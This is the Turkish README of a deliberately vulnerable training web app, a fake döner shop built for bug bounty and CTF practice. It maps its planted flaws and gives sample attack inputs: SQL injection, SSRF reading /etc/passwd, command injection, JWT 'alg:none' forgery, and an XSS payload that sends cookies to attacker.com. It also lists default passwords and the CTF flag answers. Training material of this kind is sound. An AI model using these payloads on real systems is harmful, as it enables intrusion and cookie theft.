# 🥙 Döner Dükkanı - Zafiyetli Eğitim Uygulaması

**React + Express** | OWASP Top 10 Client-Side | Bug Bounty Eğitimi

Gerçek bir döner dükkanı web uygulaması görünümünde, bilinçli olarak yerleştirilmiş 30+ güvenlik zafiyeti içeren eğitim platformu.

---

## 🚀 Kurulum

```bash
cd server && npm install && cd ../client && npm install && npx vite build
cd ../server && node server.js
```

**http://localhost:3000**

---

## 🔍 Recon Metodolojisi (Keşif Aşaması)

Gerçek bir bug bounty hedefinde olduğu gibi, zafiyetleri **keşfetmeniz** gerekiyor:

### 1. robots.txt Keşfi
```
http://localhost:3000/robots.txt
```
Gizli yollar: `/admin-panel`, `/backup/`, `/api/debug`, `/api/env`, `/graphql`, `/.env`

### 2. sitemap.xml Keşfi
```
http://localhost:3000/sitemap.xml
```
Tüm endpoint'ler listelenmiştir.

### 3. Source Map Analizi
Vite build `client/dist/assets/` altında `.map` dosyaları oluşturur.
Source map'ler React kaynak kodunu ve yorumları içerir.

### 4. .env Dosyası
```
http://localhost:3000/.env
```
API key'ler ve gizli bilgiler içerir (client/.env).

### 5. JS Bundle Analizi
`/assets/index-*.js` içinde API endpoint'leri, secret key'ler ve yorumlar bulunur.

---

## 🏴 OWASP Top 10 Client-Side Zafiyetleri

| # | Zafiyet | Lokasyon | Açıklama |
|---|---------|----------|----------|
| **C01** | **DOM Clobbering** | `App.jsx:13-14` | `window.__config` DOM element ID'leri ile clobber edilebilir |
| **C02** | **DOM XSS** | `Home.jsx:19` | `innerHTML` ile `promo` parametresi direkt HTML'e yazılır |
| **C03** | **CSS Injection** | `index.html:8` | Font-awesome CSS SRI olmadan yüklenir, CSS enjeksiyonu mümkün |
| **C04** | **PostMessage** | `App.jsx:12-23` | `window.addEventListener('message')` içinde `eval()` çalıştırılır |
| **C05** | **Insecure Storage** | `api.js:8-9`, `App.jsx:32-35` | JWT token `localStorage`'da, şifre URL fragment'ında saklanır |
| **C06** | **Prototype Pollution** | `sanitizer.js:22-31` | `deepMerge` fonksiyonu prototype pollution'a açıktır |
| **C07** | **Client-Side Access Control** | `AdminDashboard.jsx:5` | Admin paneli sadece client-side kontrol eder |
| **C08** | **Third-Party Scripts** | `index.html:8` | CDN script'leri SRI olmadan yüklenir |
| **C09** | **Missing SRI** | `index.html:8` | Hiçbir CDN kaynağı `integrity` hash'i içermez |
| **C10** | **HTML Injection** | `ProductDetail.jsx:57`, `Home.jsx:19` | `dangerouslySetInnerHTML` ile kullanıcı yorumları render edilir |

---

## 🖥️ Server-Side Zafiyetleri

| Zafiyet | Endpoint | Açıklama |
|---------|----------|----------|
| **SQL Injection** (Blind) | `POST /api/auth/login` | Timing-based blind SQLi (şifre uzunluğuna göre delay) |
| **SSRF** | `GET /api/user/avatar?url=` | Herhangi bir URL'ye istek atılabilir |
| **SSRF Bypass** | `POST /api/user/avatar` | `http://` protocol bypass |
| **Command Injection** | `GET /api/internal/health?cmd=` | Sistem komutu çalıştırma |
| **Command Injection** | `POST /api/tools/convert` | `exec()` ile shell injection |
| **IDOR** | `GET /api/orders/:id` | Herhangi bir sipariş sorgulanabilir |
| **IDOR** | `GET /api/orders/:id/receipt` | Her siparişin fişi görüntülenebilir |
| **JWT None Algorithm** | `POST /api/auth/login` | `alg: none` ile JWT kabul eder |
| **GraphQL Introspection** | `POST /api/graphql` | Schema ve tüm veriler sorgulanabilir |
| **Mass Assignment** | `POST /api/auth/register` | `role: admin` ile kayıt olunabilir |
| **Business Logic** | `POST /api/apply-coupon` | Kuponlar race condition'a açıktır |
| **Business Logic** | `POST /api/orders` | Fiyat manipülasyonu mümkün |
| **Open Redirect** | `GET /api/redirect?url=` | İstenilen URL'ye yönlendirme |
| **CORS Misconfiguration** | Tüm API | `Access-Control-Allow-Origin: *` |
| **Debug Exposure** | `GET /api/debug` | Env, header, process bilgileri sızdırır |
| **Env Leak** | `GET /api/env` | API key, JWT secret, DB credentials |
| **Path Traversal** | `/backup/` | Static file serving |
| **CSRF** | Tüm POST'lar | CSRF token'ı yok |
| **NoSQL Injection** | `POST /api/internal/auth` | JSON body injection |

---

## 🎯 Test Senaryoları

### SQL Injection (Blind Timing)
```http
POST /api/auth/login
Content-Type: application/json
X-Admin: true

{"username": "admin' OR '1'='1", "password": "test"}
```

### SSRF - İç Ağ Keşfi
```http
GET /api/user/avatar?url=http://localhost:3000/api/env
GET /api/user/avatar?url=file:///etc/passwd
```

### Command Injection
```http
GET /api/internal/health?cmd=whoami
GET /api/internal/health?cmd=dir%20..
```

### JWT None Attack
```javascript
// Header: {"alg":"none"}
// Payload: {"id":1,"username":"admin","role":"admin"}
// Signature: (empty)
const token = base64(header) + '.' + base64(payload) + '.'
```

### GraphQL Introspection
```graphql
query {
  __schema {
    types { name, fields { name } }
  }
}
```

### Mass Assignment (Admin Registration)
```http
POST /api/auth/register
Content-Type: application/json

{"username": "hacker", "password": "123456", "role": "admin"}
```

### Business Logic - Race Condition
```http
# Aynı anda birden çok istek gönder
POST /api/apply-coupon
Content-Type: application/json

{"code": "KASAP50", "total": 100}
```

### DOM XSS (Client-Side)
```
/?promo=<img src=x onerror="fetch('http://attacker.com/?'+document.cookie)">
```

### PostMessage XSS
```javascript
window.postMessage({type: 'eval', code: 'alert(document.cookie)'}, '*')
```

### Prototype Pollution
```javascript
// deepMerge ile prototype pollution
const payload = JSON.parse('{"__proto__":{"isAdmin":true}}')
```

---

## 👤 Kullanıcı Bilgileri

| Kullanıcı | Şifre | Rol |
|-----------|-------|-----|
| admin | admin123 | admin |
| musteri | 123456 | customer |
| ahmet | ahmet123 | customer |
| zeynep | zeynep99 | customer |

---

## 🏁 Flag'ler

| Flag | Değer | Zafiyet |
|------|-------|---------|
| 🏴 sqli_flag | `CTF{Bl1nd_SQLi_T1m1ng_D0n3r}` | SQL Injection |
| 🏴 ssrf_flag | `CTF{SSRF_Pr0t0c0l_ByP4s5_D0n3r}` | SSRF |
| 🏴 cmdi_flag | `CTF{C0mm4nd_1nj3ct10n_D0n3r_K3b4b}` | Command Injection |
| 🏴 idor_flag | `CTF{1D0R_0rd3r_L3ak_D0n3r}` | IDOR |
| 🏴 jwt_flag | `CTF{JWT_N0n3_4lg_R3m0t3_C0d3}` | JWT None |
| 🏴 graphql_flag | `CTF{Gr4phQL_1ntr0sp3ct_K3b4b}` | GraphQL |
| 🏴 env_flag | `CTF{Env_V4r14bl3_L3ak_D0n3r}` | Env Leak |

Flag'leri `server/data/db.json` ve `/api/env` endpointinde bulabilirsin.

---

## ⚠️ Uyarı

Bu uygulama **EĞİTİM AMAÇLIDIR** ve bilinçli olarak güvenlik zafiyetleri içermektedir.
Gerçek ortamlarda, üretimde veya başkasına ait sistemlerde KULLANMAYIN.

---

## 📁 Proje Yapısı

```
doner-dukkani/
├── server/
│   ├── server.js        # Ana sunucu (tüm API + zafiyetler)
│   ├── data/db.json     # Veritabanı (flags dahil)
│   ├── internal/panel.html  # Gizli admin paneli
│   └── package.json
├── client/
│   ├── src/
│   │   ├── App.jsx      # PostMessage + routing + auth
│   │   ├── services/    # API servisi (insecure storage)
│   │   ├── utils/       # Sanitizer (prototype pollution)
│   │   └── pages/       # React sayfaları
│   ├── public/          # robots.txt, sitemap.xml
│   ├── .env             # Sızdırılmış environment
│   └── package.json
└── README.md
```
